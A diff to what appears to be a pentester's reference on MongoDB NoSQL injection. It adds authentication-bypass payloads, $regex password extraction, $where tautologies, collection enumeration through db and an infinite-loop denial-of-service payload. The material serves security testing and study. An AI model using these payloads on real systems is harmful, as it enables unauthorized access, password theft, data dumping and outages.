@@ -2,7 +2,7 @@
 
 /!\ IMPORTANT /!\
 
-Note that blind NoSQL injections are only available in versions of
+Note that NoSQL injections using `db` are only available in versions of
 MongoDB prior to 2.4 (released in March 2013). Since this version, the global
 variable `db` was completely removed.
 
@@ -32,7 +32,8 @@ The CRUD operations allows to create, read, update, and delete documents.
 
 *Create operations*
 
-If the collection does not currently exist, insert operations will create the collection.
+If the collection does not currently exist, insert operations will create the
+collection.
 
 | Function | Description | Example |
 |----------|-------------|---------|
@@ -126,7 +127,6 @@ While the parameters can be left blank for the injection, a pre
 check on the supplied data may require values to be provided.
 
 ```
-# PHP - abuse the way PHP initialize arrays
 # GET/POST key-value pairs
 username[$ne]=&password[$ne]=
 username[$ne]=we&password[$ne]=we
@@ -138,13 +138,36 @@ username[$nin][]=user1&username[$nin][]=user2&password[$ne]=we
 {"username": {"$ne": null}, "password": {"$ne": null} }
 {"username": {"$ne": "we"}, "password": {"$ne": "we"} }
 {"username": {"$gt": undefined}, "password": {"$gt": undefined} }
+
+# Works as long as the username is correct
+username=admin’, $or: [ {}, {‘a’:   ‘a&password=’ }],
+
+# Other bypass injection payloads
+true, $where: '1 == 1'
+'true, $where: '1 == 1'
+', $where: '1 == 1'
+a', $where: '1 == 1'
+'$where: '1 == 1'
+'1, $where: '1 == 1'
+'{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+'db.injection.insert({success:1});
+'db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
 ```
 
 ###### Authentication extract password
 
-An injection a login form can be used to retrieve an user clear text password.
-The ` $regex` evaluation operator allows to determine the password length and
-a letter by letter matching.  
+An injection in a login form can be used to retrieve an user clear text
+password.
+The `$regex` evaluation operator can be used to determine the password length
+and the password itself using letter by letter matching.  
 
 The authentication will fail as soon as the condition specified by the regex
 evaluate to false.
@@ -155,18 +178,91 @@ username=<USERNAME>&password[$regex]=.{1}
 ...
 username=<USERNAME>&password[$regex]=.{<N>}
 
-# Extract clear-text password
+# Extract clear-text password - GET/POST key-value pairs
 username=<USERNAME>&password[$regex]=<LETTER>.{<PASSWORD_LENGTH>}
 ...
-username=<USERNAME>&password[$regex]=p@ss.{<PASSWORD_LENGTH - 4>}
+username=<USERNAME>&password[$regex]=p@ss<NEXT_LETTER>.{<PASSWORD_LENGTH - 4>}
+
+# Extract clear-text password - JSON
+{"username": {"$eq": "admin"}, "password": {"$regex": "^<LETTER>" }}
+...
+{"username": {"$eq": "admin"}, "password": {"$regex": "^p@ss<NEXT_LETTER>" }}
 ```
 
-###### Meta information gathering
+###### `$where` tautology
 
-###### Databases enumeration
+The `$where` operator can be used to make conditional statements such as the
+one in the following code:
 
-###### Tables and columns enumeration
+```
+var query = {
+    $where: "this.secretCode === " + req.body.secretCode
+}
 
-###### Data exfiltration
+db.secretData.find(query).each(function(err, doc) {
+    console.log(doc);
+})
+```
 
-###### Denial of Service
+Conditions in `$where` clause could be bypassed using the following injections:
+
+```
+'0; return true'
+'\'; return \'\' == \''
+```
+
+###### NoSQL injection using `db`
+
+Note that, as specified above, blind NoSQL injections are not possible on
+MongoDB 2.4 and subsequent versions. Prior to this version, the global `db`
+variable could be referenced to and used in injection.
+
+Different injections' syntax may work:
+
+```
+
+'||(tojsononeline(<INJECT>)|'
+"\"'||this||'", "'||<INJECT>||'"
+ ["\"';return+true;var+foo='", "';return+[inject];var+foo='"],
+ ['\'"||this||"','"||[inject]||"'],
+ ['\'";return+true;var+foo="', '";return+[inject];var+foo="'],
+ ["||this","||[inject]"]]
+
+```
+
+*Collections length and names*
+
+The Metasploit module `auxiliary/gather/mongodb_js_inject_collection_enum` can
+be used to enumerate the collections available via boolean injections.
+
+The following operations can be used to retrieve the collections length and
+names manually:
+
+```
+# Number of collections
+db.getCollectionNames().length==<N>
+
+# Collections name's length
+db.getCollectionNames()[<COLLECTION_INDEX>].length==<N>
+
+# Collections names'
+db.getCollectionNames()[<COLLECTION_INDEX>][<NAME_LETTER_INDEX>]=='<LETTER>'
+```
+
+*Collections enumeration*
+
+To enumerate a collection documents:
+
+```
+db.<COLLECTION_NAME>.find()[0])[0]=='u'
+tojson(db.<COLLECTION_NAME>.find().toArray()).replace(/[%5Ct%5Cr%5Cn]/gm, \'\')[].charCodeAt()==' + num;
+```
+
+###### `$where` Denial of Service
+
+An injection in a `$where` close could be leveraged to realize a Denial of
+Service by exhausting the server resources using:
+
+```
+'0; while(true){}'
+```
